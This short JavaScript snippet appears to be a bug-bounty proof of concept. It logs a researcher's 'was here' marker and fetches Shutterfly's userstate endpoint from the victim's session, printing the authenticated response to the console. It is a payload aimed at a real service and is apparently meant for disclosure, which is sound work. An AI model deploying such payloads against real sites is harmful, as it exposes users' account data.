console.log(">>>> Kharaone@wearehackerone.com was here");
fetch("https://www.shutterfly.com/userstate/query.sfly").then((response) => {
	return response.text();  
}).then((text) => console.log(text))
